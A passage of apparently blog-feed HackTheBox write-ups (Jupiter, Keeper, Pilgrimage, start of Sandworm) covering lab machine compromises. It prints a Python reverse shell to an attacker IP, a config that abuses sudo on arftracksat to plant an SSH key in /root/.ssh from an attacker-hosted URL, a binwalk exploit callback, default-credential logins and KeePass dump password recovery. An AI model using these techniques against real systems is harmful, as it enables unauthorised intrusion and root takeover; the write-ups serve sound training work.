<p><img src="/assets/img/Pasted image 20230902095316.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">.ssh</code> directory exists, and there is an empty <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, so I dropped an SSH key into it, and was able to login;</p>

<p><img src="/assets/img/Pasted image 20230902095408.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">ss -ltnp</code> showed there is a hidden service running locally on port <code class="language-plaintext highlighter-rouge">8888</code>. This turns out to be an instance of <em>Jupiter Notebook</em>;</p>

<p><img src="/assets/img/Pasted image 20230902095701.png" alt="" /></p>

<p>We canâ€™t access it since we do not have a token. Going through the filesystem, I found a token in the log files at <code class="language-plaintext highlighter-rouge">/opt/solar-flares/logs</code>, which gave me access;</p>

<p><img src="/assets/img/Pasted image 20230902095744.png" alt="" />
<img src="/assets/img/Pasted image 20230902095810.png" alt="" /></p>

<p>I created a new notebook and ran python reverse shell;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">pty</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.10.16.73"</span><span class="p">,</span><span class="mi">4444</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230902100015.png" alt="" />
<img src="/assets/img/Pasted image 20230902100037.png" alt="" /></p>

<p>User has <code class="language-plaintext highlighter-rouge">sudo</code> perms on <code class="language-plaintext highlighter-rouge">/usr/local/bin/sattrack</code>, which turned out to be <a href="https://github.com/arf20/arftracksat">arftracksat</a>;</p>

<p><img src="/assets/img/Pasted image 20230902100347.png" alt="" /></p>

<p>Setting up the tool locally and figuring out how it works, I discovered the <code class="language-plaintext highlighter-rouge">tlesources</code> array in itâ€™s config accepts a list of URLs to download <code class="language-plaintext highlighter-rouge">.tle</code> files from, and save them to the path defined in <code class="language-plaintext highlighter-rouge">tleroot</code>. Knowing this, I was able to drop an SSH key into the root userâ€™s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file using the following config (light reversing showed it expects a config file at <code class="language-plaintext highlighter-rouge">/tmp/config.json</code>);</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"tleroot"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/root/.ssh/"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"tlefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"weather.txt"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"mapfile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/map.json"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"texturefile"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/usr/local/share/sattrack/earth.png"</span><span class="p">,</span><span class="w">
  
  </span><span class="nl">"updatePerdiod"</span><span class="p">:</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span><span class="w">

  </span><span class="nl">"tlesources"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="s2">"http://10.10.16.73/authorized_keys"</span><span class="w">
  </span><span class="p">],</span><span class="w">

  </span><span class="nl">"station"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"NOAA 15"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lat"</span><span class="p">:</span><span class="w"> </span><span class="mf">37.6725</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lon"</span><span class="p">:</span><span class="w"> </span><span class="mf">-1.5863</span><span class="p">,</span><span class="w">
    </span><span class="nl">"hgt"</span><span class="p">:</span><span class="w"> </span><span class="mf">335.0</span><span class="w">
  </span><span class="p">},</span><span class="w">

  </span><span class="nl">"show"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="s2">"NOAA 15"</span><span class="w">
  </span><span class="p">],</span><span class="w">

  </span><span class="nl">"columns"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="s2">"name"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"azel"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"dis"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"geo"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"tab"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"pos"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"vel"</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230902101212.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP found port <strong>22</strong> and <strong>80</strong></li>
  <li>Site running an instance of Grafana;
    <ul>
      <li>Found an endpoint that accepts and execute raw SQL queries.</li>
      <li>Exploited it to gain a shell on the box as <code class="language-plaintext highlighter-rouge">postgres</code>.</li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">postgres</code>;
    <ul>
      <li>Exploited <em>Shadow Simulator</em> to gain a shell as <code class="language-plaintext highlighter-rouge">juno</code></li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">juno</code>;
    <ul>
      <li>Recovered <em>Jupyter Notebook</em> token from log files.</li>
      <li>Gain code execution as <code class="language-plaintext highlighter-rouge">jovian</code>.</li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">jovian</code>;
    <ul>
      <li>Exploited sudo perms on <em>Arftracksat</em> steal root SSH key.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="medium" /><category term="linux" /><category term="web" /><category term="grafana" /><category term="sql injection" /><category term="postgresql" /><category term="shadow simulator" /><category term="jupyter notebook" /><category term="arftracksat" /><summary type="html"><![CDATA[Jupiter is a very nice medium linux box on HackTheBox. It starts with exploiting an instance of Grafana thatâ€™s making an API call containing full SQL queries, which are executed without validation. Youâ€™ll then exploit a shadow simulator cron job to gain access to a local user. This will give you access to some log files containing access token for a local Jupyter Notebook instance. Privesc involves exploiting Arftracksat, a satellite tracker.]]></summary></entry><entry><title type="html">Keeper - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/keeper.html" rel="alternate" type="text/html" title="Keeper - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/keeper</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/keeper.html"><![CDATA[<p><strong>Keeper</strong> is an easy linux machine on <em>HackTheBox</em>. It starts with exploiting an administrative feature on <em>Best Practical RT</em> instance that was using default creds to add a custom event handler that run a shell command when triggered. Privesc is by recovering KeePass master password from a crash dump.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230901115717.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230901115737.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Sat Aug 12 20:06:28 2023 as: nmap -sV -sC -oN nmap.txt -v 10.129.96.10
Increasing send delay for 10.129.96.10 from 0 to 5 due to 60 out of 199 dropped probes since last increase.
Nmap scan report for 10.129.96.10
Host is up (0.42s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 12 20:07:32 2023 -- 1 IP address (1 host up) scanned in 63.68 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Homepage links us to a subdomain <code class="language-plaintext highlighter-rouge">tickets.keeper.htb/rt</code>;</p>

<p><img src="/assets/img/Pasted image 20230901115937.png" alt="" />
<img src="/assets/img/Pasted image 20230901120229.png" alt="" /></p>

<p>According to itâ€™s <a href="https://github.com/bestpractical/rt">GitHub</a>;</p>
<blockquote>
  <p>RT is an enterprise-grade issue tracking system. It allows organizations to keep track of what needs to get done, who is working on which tasks, whatâ€™s already been done, and when tasks were (or werenâ€™t) completed.</p>
</blockquote>

<p>The default creds for this service is <code class="language-plaintext highlighter-rouge">root:password</code>, and I was able to login using it;</p>

<p><img src="/assets/img/Pasted image 20230901120445.png" alt="" /></p>

<p>One ticket was found created by <code class="language-plaintext highlighter-rouge">root</code> user to <code class="language-plaintext highlighter-rouge">lnorgaard</code>;</p>

<p><img src="/assets/img/Pasted image 20230901120532.png" alt="" /></p>

<p>The ticket is talking about an attached crash dump of KeePass, which is a password manager, but the dump has been moved by <code class="language-plaintext highlighter-rouge">lnorgaard</code> for security reasons, and the attachment deleted;</p>

<p><img src="/assets/img/Pasted image 20230901120744.png" alt="" /></p>

<p>Exploring the dashboard further, I discovered that the application has a feature used for triggering actions (known as <em>scripts</em>) in response to certain events. Going to <code class="language-plaintext highlighter-rouge">Admin &gt;&gt; Scripts &gt;&gt; Select</code>, I get a list of all configured scripts;</p>

<p><img src="/assets/img/Pasted image 20230901121228.png" alt="" /></p>

<p>The condition for the first script looks interesting as itâ€™s triggered when a user commented on a ticket. Clicking on it, we have an option to change the script <em>condition</em> to <em>User Defined</em>;</p>

<p><img src="/assets/img/Pasted image 20230901121713.png" alt="" /></p>

<p>This allows us to define our own perl code that will be executed to determine if the condition was satisfied. So I added a perl code in the condition field that would run a bash reverse shell;</p>

<p><img src="/assets/img/Pasted image 20230901122127.png" alt="" /></p>

<p>Submitting this however, I got a weird error message;</p>

<p><img src="/assets/img/Pasted image 20230901122226.png" alt="" /></p>

<p>It seems the application is expecting our <code class="language-plaintext highlighter-rouge">Referer</code> header to be <code class="language-plaintext highlighter-rouge">keeper.htb</code>, which makes no sense since the domain itâ€™s running on is <code class="language-plaintext highlighter-rouge">tickets.keeper.htb</code>. So I went to <em>Caidoâ€™s</em> match and replace tab and setup a rule that will replace <code class="language-plaintext highlighter-rouge">Referer: http://tickets.keeper.htb</code> with <code class="language-plaintext highlighter-rouge">Referer: http://keeper.htb</code> in every request, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230901122703.png" alt="" />
<img src="/assets/img/Pasted image 20230901122742.png" alt="" /></p>

<p>I then went back to the existing ticket, and clicked the comment option, which was enough to trigger the payload;</p>

<p><img src="/assets/img/Pasted image 20230901122947.png" alt="" />
<img src="/assets/img/Pasted image 20230901123002.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>There is a local user named <code class="language-plaintext highlighter-rouge">lnorgaard</code> in the box. Checking their home directory, I found a <code class="language-plaintext highlighter-rouge">.zip</code> file with what looks like the keepass dump mentioned in the ticket earlier;</p>

<p><img src="/assets/img/Pasted image 20230901123355.png" alt="" /></p>

<p>So I downloaded it to my box. Looking for ways to exploit this lead me to <a href="https://github.com/CMEPW/keepass-dump-masterkey">this repo</a>, which gave a PoC for extracting master password from a <code class="language-plaintext highlighter-rouge">.dmp</code> file of KeePass. Running it on the dump file, I got a few variations of the master password;</p>

<p><img src="/assets/img/Pasted image 20230901182251.png" alt="" /></p>

<p>Note that itâ€™s unable to properly detect/display 3 letters, and the second letter of the password varies in each. I went crazy trying to crack this using the <em>mask</em> mode of <code class="language-plaintext highlighter-rouge">john</code>, but no luck. Replacing the unrecognized characters with a placeholder though revealed the actual phrase;</p>

<p><img src="/assets/img/Pasted image 20230901182727.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">rÃ¸dgrÃ¸d med flÃ¸de</code>, I was able to open the <code class="language-plaintext highlighter-rouge">passcodes.kdbx</code> file with KeePassXC, and found an SSH key for a user named <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230901183152.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">file</code> identified it as a <em>PuTTY Private Key File</em>, which the OpenSSH client does not support;</p>

<p><img src="/assets/img/Pasted image 20230901183634.png" alt="" /></p>

<p>Attempt to convert it to PEM using <code class="language-plaintext highlighter-rouge">puttygen</code> (provided in the package <code class="language-plaintext highlighter-rouge">putty-tools</code>) gave an error;</p>

<p><img src="/assets/img/Pasted image 20230901183853.png" alt="" /></p>

<p>I was able to downgrade the key to version 2 PPK  using <code class="language-plaintext highlighter-rouge">puttygen</code> in <code class="language-plaintext highlighter-rouge">wine</code> by going to <code class="language-plaintext highlighter-rouge">Key &gt;&gt; Load Private Key</code> and selecting the ppk file, then going to <code class="language-plaintext highlighter-rouge">Key &gt;&gt; Parameters for saving key files</code> and ticking version 2;</p>

<p><img src="/assets/img/Pasted image 20230901184807.png" alt="" /></p>

<p>I then saved the key as <code class="language-plaintext highlighter-rouge">key.ppk</code>, used <code class="language-plaintext highlighter-rouge">puttygen</code> to convert it back to PEM, and was able to get in as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230901185133.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP found port <strong>22</strong> and <strong>80</strong></li>
  <li>Web running an instance of <strong>Best Practical RT</strong>, and was using default creds;
    <ul>
      <li>Exploited the <em>scripts</em> feature to gain code execution on the box as <code class="language-plaintext highlighter-rouge">www-data</code></li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li>Found a keepass dump and vault file in the directory of <code class="language-plaintext highlighter-rouge">lnorgaard</code></li>
      <li>Extracted the master key from the dump file to gain access to the vault and obtain root SSH key</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="easy" /><category term="linux" /><category term="best practical rt" /><category term="keepass" /><category term="perl" /><category term="rce" /><category term="crashdump" /><category term="putty" /><category term="puttygen" /><summary type="html"><![CDATA[Keeper is an easy linux machine on HackTheBox. It starts with exploiting an administrative feature on Best Practical RT instance that was using default creds to add a custom event handler that run a shell command when triggered. Privesc is by recovering KeePass master password from a crash dump.]]></summary></entry><entry><title type="html">Pilgrimage - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/pilgrimage.html" rel="alternate" type="text/html" title="Pilgrimage - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/pilgrimage</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/pilgrimage.html"><![CDATA[<p><strong>Pilgrimage</strong> is an easy linux machine on <em>HackTheBox</em>. It starts with a exploiting a CVE on <em>ImageMagick</em> to leak a local sqlite database. Privesc to root is through a <em>binwalk</em> exploit.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230901101634.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230901101659.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Wed Aug 16 10:43:20 2023 as: nmap -sC -sV -oN nmap.txt 10.10.11.219
Nmap scan report for 10.10.11.219
Host is up (0.40s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 16 10:44:30 2023 -- 1 IP address (1 host up) scanned in 70.40 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230901102052.png" alt="" /></p>

<p>Able to register an account and login;</p>

<p><img src="/assets/img/Pasted image 20230901102400.png" alt="" /></p>

<p>The <em>shrink</em> feature is used for image compression. Tried uploading a PNG file with <code class="language-plaintext highlighter-rouge">.php</code> extension, but didnâ€™t work as the application is randomizing the name and appending a <code class="language-plaintext highlighter-rouge">.png</code> extension;</p>

<p><img src="/assets/img/Pasted image 20230901103047.png" alt="" /></p>

<p>Since this is linux and judging by the box name, we can be confident the application is using <em>ImageMagick</em> to do this compression. So I started looking for known vulnerabilities and <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-44268">CVE-2022-44268</a> caught my attention as it could give us an LFI on the server. Using the PoC in <a href="https://github.com/agathanon/cve-2022-44268">this repo</a>, I was able to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> after creating a sample image <code class="language-plaintext highlighter-rouge">test.png</code>;</p>

<p><img src="/assets/img/Pasted image 20230901103811.png" alt="" />
<img src="/assets/img/Pasted image 20230901103831.png" alt="" />
<img src="/assets/img/Pasted image 20230901103901.png" alt="" /></p>

<p>And we have LFI :)</p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>NMAP told us this is an Nginx server, so I started looking for the configs locally using the LFI. Oddly, the default config at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code> doesnâ€™t seem to exist. Most HTB boxes with Nginx or Apache vhosts usually used the naming convention of <code class="language-plaintext highlighter-rouge">&lt;box-name&gt;.htb</code> for their config files, so I checked for <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/pilgrimage.htb</code>, and got a hit;</p>

<p><img src="/assets/img/Pasted image 20230901104558.png" alt="" /></p>

<p>With the web root known, I started going after application source code. The <code class="language-plaintext highlighter-rouge">register.php</code> file used to create an account is interesting because files like this usually link to some file containing database credentials. Leaking it, we got something;</p>

<p><img src="/assets/img/Pasted image 20230901105114.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">extract.py</code> script provided in the PoC was unable to extract the file, even though running <code class="language-plaintext highlighter-rouge">exiftool</code> on the downloaded file showed some data was embedded;</p>

<p><img src="/assets/img/Pasted image 20230901105541.png" alt="" /></p>

<p>Running the suggested <code class="language-plaintext highlighter-rouge">-b</code> flag with exiftool printed some long hex blob;</p>

<p><img src="/assets/img/Pasted image 20230901105712.png" alt="" /></p>

<p>Notice the hex bytes <code class="language-plaintext highlighter-rouge">53514</code>, which matches the magic bytes of an sqlite database;</p>

<p><img src="/assets/img/Pasted image 20230901110042.png" alt="" /></p>

<p>I copied the hex blob to a file, and decoded it with pythonâ€™s <code class="language-plaintext highlighter-rouge">binascii.unhexlify()</code>;</p>

<p><img src="/assets/img/Pasted image 20230901110632.png" alt="" /></p>

<p>Connecting to the db, we got a cred;</p>

<p><img src="/assets/img/Pasted image 20230901110731.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">/etc/passwd</code> showed there is a local user named <code class="language-plaintext highlighter-rouge">emily</code>, so I tried the password on her account over SSH, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230901110840.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>No <code class="language-plaintext highlighter-rouge">sudo</code> perms or special groups for <code class="language-plaintext highlighter-rouge">emily</code>. <code class="language-plaintext highlighter-rouge">pspy</code> picked up a cron job running <code class="language-plaintext highlighter-rouge">/usr/sbin/malwarescan.sh</code> as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">blacklist</span><span class="o">=(</span><span class="s2">"Executable script"</span> <span class="s2">"Microsoft executable"</span><span class="o">)</span>

/usr/bin/inotifywait <span class="nt">-m</span> <span class="nt">-e</span> create /var/www/pilgrimage.htb/shrunk/ | <span class="k">while </span><span class="nb">read </span>FILE<span class="p">;</span> <span class="k">do
        </span><span class="nv">filename</span><span class="o">=</span><span class="s2">"/var/www/pilgrimage.htb/shrunk/</span><span class="si">$(</span>/usr/bin/echo <span class="s2">"</span><span class="nv">$FILE</span><span class="s2">"</span> | /usr/bin/tail <span class="nt">-n</span> 1 | /usr/bin/sed <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'s/^.*CREATE //p'</span><span class="si">)</span><span class="s2">"</span>
        <span class="nv">binout</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>/usr/local/bin/binwalk <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span><span class="si">)</span><span class="s2">"</span>
        <span class="k">for </span>banned <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">blacklist</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
                if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$binout</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"</span><span class="nv">$banned</span><span class="s2">"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                        /usr/bin/rm <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span>
                        <span class="nb">break
                </span><span class="k">fi
        done
done</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>What this script basically do is;</p>
<ol>
  <li>Monitor the directory <code class="language-plaintext highlighter-rouge">/var/www/pilgrimage.htb/shrunk/</code> for file creation events using <code class="language-plaintext highlighter-rouge">inotifywait</code>, which will hang until a new file is created.</li>
  <li>Once a file is created, the files inside the directory with the string <code class="language-plaintext highlighter-rouge">CREATE </code> in their filenames are passed to <code class="language-plaintext highlighter-rouge">sed</code>, which selects the part of the name after <code class="language-plaintext highlighter-rouge">CREATE </code>.</li>
  <li>The output of <code class="language-plaintext highlighter-rouge">sed</code> is then used as argument in a call to <code class="language-plaintext highlighter-rouge">binwalk -e</code>.</li>
</ol>

<p>(Correction: You actually donâ€™t <em>need</em> to add â€œCREATE â€œ in the filename)</p>

<p>This is interesting because <code class="language-plaintext highlighter-rouge">/var/www/pilgrimage.htb/shrunk/</code> is the globally writable;</p>

<p><img src="/assets/img/Pasted image 20230901111811.png" alt="" /></p>

<p>And <code class="language-plaintext highlighter-rouge">searchsploit pilgrimage</code> showed it has an RCE CVE;</p>

<p><img src="/assets/img/Pasted image 20230901112109.png" alt="" />
<img src="/assets/img/Pasted image 20230901112137.png" alt="" /></p>

<p>The exploit basically injects malicious python code into a template <code class="language-plaintext highlighter-rouge">.png</code> file, which is executed by <code class="language-plaintext highlighter-rouge">binwalk</code> during extraction;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python 51249.py test.png 10.10.16.73 4444
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230901114004.png" alt="" />
<img src="/assets/img/Pasted image 20230901114023.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP found port <strong>22</strong> and <strong>80</strong></li>
  <li>Exploited <strong>CVE-2022-44268</strong> to leak a local sqlite database containing creds for user <code class="language-plaintext highlighter-rouge">emily</code></li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">emily</code>;
    <ul>
      <li>Exploited a cron job thatâ€™s calling <em>binwalk v2.3.2</em> to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="easy" /><category term="linux" /><category term="web" /><category term="imagemagick" /><category term="CVE-2022-44268" /><category term="lfi" /><category term="sqlite" /><category term="binwalk" /><summary type="html"><![CDATA[Pilgrimage is an easy linux machine on HackTheBox. It starts with a exploiting a CVE on ImageMagick to leak a local sqlite database. Privesc to root is through a binwalk exploit.]]></summary></entry><entry><title type="html">Sandworm - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/sandworm.html" rel="alternate" type="text/html" title="Sandworm - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/sandworm</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/sandworm.html"><![CDATA[<p><strong>Sandworm</strong> is a nice medium linux box on <em>HackTheBox</em>. It starts with exploiting an SSTI vulnerability in a custom web app that does some PGP operations using user input. Once inside, youâ€™ll need to break out of <em>firejail</em> by injecting payload into a Go project thatâ€™s been used in a cron job. Privesc is through SUID exploit on <em>firejail</em>.</p>

<p><br /></p>

<h3 id="sandworm">Sandworm</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230903200630.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230903200659.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Mon Aug 21 22:17:32 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.218
Nmap scan report for 10.10.11.218
Host is up (0.51s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
| MD5:   b8b7 487e f3e2 14a4 999e f842 0141 59a1
|_SHA-1: 80d9 2367 8d7b 43b2 526d 5d61 00bd 66e9 48dd c223
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
